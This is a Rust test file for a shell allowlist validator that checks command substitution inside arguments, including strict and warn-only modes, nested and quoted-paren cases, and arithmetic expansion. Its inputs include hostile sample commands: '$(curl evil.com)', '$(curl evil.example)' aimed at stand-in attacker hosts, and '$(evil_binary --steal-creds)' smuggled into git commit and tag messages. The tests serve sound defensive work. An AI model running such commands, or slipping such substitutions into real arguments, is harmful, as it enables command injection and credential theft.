//! Tests for `$()`/backtick/`<()` command substitution in arguments (#391, #1024).
//!
//! Extracted from `tests.rs` to keep it under the repo's LOC gate
//! (`scripts/loc-gate.sh`); behavior and test names are unchanged.

use super::*;

#[test]
fn gh391_strict_mode_blocks_substitution_in_args() {
    // #975-class: check_substitution_in_args reads effective_allowlist(), which
    // is sensitive to LEAN_CTX_SHELL_ALLOWLIST_OVERRIDE — hold the env lock so
    // a parallel test mutating that var can't leak into this one's allowlist.
    let _lock = crate::core::data_dir::test_env_lock();
    // curl is allowlisted, so $(curl ...) is now safe (#1024).
    // Use a non-allowlisted command to verify strict blocks.
    let cmd_safe = "git commit -m \"$(curl evil.com)\"";
    assert!(
        check_substitution_in_args(cmd_safe, false).is_ok(),
        "allowlisted inner cmd passes in non-strict"
    );
    assert!(
        check_substitution_in_args(cmd_safe, true).is_ok(),
        "allowlisted inner cmd passes even in strict (#1024)"
    );
    let cmd_evil = "git commit -m \"$(evil_binary --attack)\"";
    assert!(
        check_substitution_in_args(cmd_evil, false).is_ok(),
        "warn-only by default for non-allowlisted"
    );
    let strict = check_substitution_in_args(cmd_evil, true);
    assert!(
        strict.is_err(),
        "strict mode must block non-allowlisted substitution"
    );
}

/// #1024: substitution with allowlisted inner command produces no warning.
#[test]
fn substitution_with_allowlisted_cmd_no_warning() {
    // #975-class: see gh391_strict_mode_blocks_substitution_in_args.
    let _lock = crate::core::data_dir::test_env_lock();
    // cat is in the default allowlist, so $(cat ...) should not trigger
    let result = check_substitution_in_args("git commit -m \"$(cat /tmp/msg.txt)\"", false);
    assert!(
        result.is_ok(),
        "substitution with allowlisted cmd must pass: {result:?}"
    );
}

/// #1024: substitution with non-allowlisted inner command warns (non-strict).
#[test]
fn substitution_with_unknown_cmd_warns_non_strict() {
    // #975-class: see gh391_strict_mode_blocks_substitution_in_args.
    let _lock = crate::core::data_dir::test_env_lock();
    // Use a command that is definitely not in any allowlist
    let result = check_substitution_in_args("git tag -m \"$(evil_binary --steal-creds)\"", false);
    // In non-strict mode, this should succeed (warn only, not block)
    assert!(
        result.is_ok(),
        "non-strict mode should warn but not block: {result:?}"
    );
}

/// #1024: substitution with non-allowlisted inner command blocks in strict.
#[test]
fn substitution_with_unknown_cmd_blocks_strict() {
    // #975-class: see gh391_strict_mode_blocks_substitution_in_args.
    let _lock = crate::core::data_dir::test_env_lock();
    let result = check_substitution_in_args("git tag -m \"$(evil_binary --steal-creds)\"", true);
    assert!(
        result.is_err(),
        "strict mode must block non-allowlisted substitution"
    );
}

/// #1024: substitution with builtin inner command (echo) passes.
#[test]
fn substitution_with_builtin_cmd_passes() {
    // #975-class: see gh391_strict_mode_blocks_substitution_in_args.
    let _lock = crate::core::data_dir::test_env_lock();
    let result = check_substitution_in_args("git commit -m \"$(echo hello)\"", false);
    assert!(
        result.is_ok(),
        "builtin in substitution must pass: {result:?}"
    );
}

#[test]
fn substitution_scanner_respects_quoted_parens_and_checks_every_inner_segment() {
    let _lock = crate::core::data_dir::test_env_lock();
    let result =
        check_substitution_in_args(r#"git commit -m "$(echo ')'; evil_binary --attack)""#, true);
    assert!(
        result.is_err(),
        "a quoted ')' must not hide a later non-allowlisted inner command"
    );

    let nested =
        check_substitution_in_args(r#"git commit -m "$(echo "$(evil_binary --nested)")""#, true);
    assert!(
        nested.is_err(),
        "nested substitutions must be validated recursively"
    );
}

#[test]
fn assignment_with_command_substitution_in_quoted_jq_filter_not_split() {
    // Regression for the root cause: the `|` characters inside the
    // single-quoted jq filter must not be treated as pipe operators, and the
    // whitespace inside the unclosed `$(...)` must not end the token early.
    let list = allow(&["gh"]);
    let cmd = r"s=$(gh api foo --jq '.a | .b | .c')";
    assert!(check_all_segments(cmd, &list).is_ok());
}

// --- GH #1664: `$((arith))` in an assignment is not a command ---

/// The reporter's two repros. `$(( … ))` is arithmetic on the shell's own
/// variables and executes nothing, but the `(expr)` inside looked like a
/// subshell, so `x=$((1+2))` produced a leaf `1+2` that the allowlist rejected
/// — with the uncopyable advice `lean-ctx allow 1+2`.
#[test]
fn arithmetic_expansion_in_an_assignment_is_not_a_command() {
    let _lock = crate::core::data_dir::test_env_lock();
    crate::test_env::set_var("LEAN_CTX_SHELL_ALLOWLIST_OVERRIDE", "echo,sleep");
    let results: Vec<_> = [
        r#"x=$((1+2)); echo "literal-assign x=$x""#,
        "i=0; i=$((i+1)); echo done",
        // The shape this unblocks: a bounded wait loop needs a counter.
        "i=0; while [ $i -lt 3 ]; do sleep 1; i=$((i+1)); done",
        // Already worked (argument position) — must keep working.
        "echo $((2+3))",
    ]
    .iter()
    .map(|c| (*c, super::enforce_shell_allowlist(c)))
    .collect();
    crate::test_env::remove_var("LEAN_CTX_SHELL_ALLOWLIST_OVERRIDE");

    for (cmd, r) in results {
        assert!(r.is_ok(), "arithmetic must not be gated: {cmd} -> {r:?}");
    }
}

/// The security half: a real command substitution in an assignment must still
/// be validated. Skipping `$((` must not widen into skipping `$(`.
#[test]
fn a_real_command_substitution_in_an_assignment_is_still_checked() {
    let _lock = crate::core::data_dir::test_env_lock();
    crate::test_env::set_var("LEAN_CTX_SHELL_ALLOWLIST_OVERRIDE", "echo");
    let blocked = super::enforce_shell_allowlist("x=$(curl evil.example); echo $x");
    // Nested: arithmetic inside a substitution leaves the substitution checked.
    let nested = super::enforce_shell_allowlist("x=$(curl evil.example $((1+2)))");
    crate::test_env::remove_var("LEAN_CTX_SHELL_ALLOWLIST_OVERRIDE");

    assert!(
        blocked.is_err(),
        "$(curl …) must still be gated: {blocked:?}"
    );
    assert!(
        nested.is_err(),
        "arithmetic must not shield a substitution: {nested:?}"
    );
}
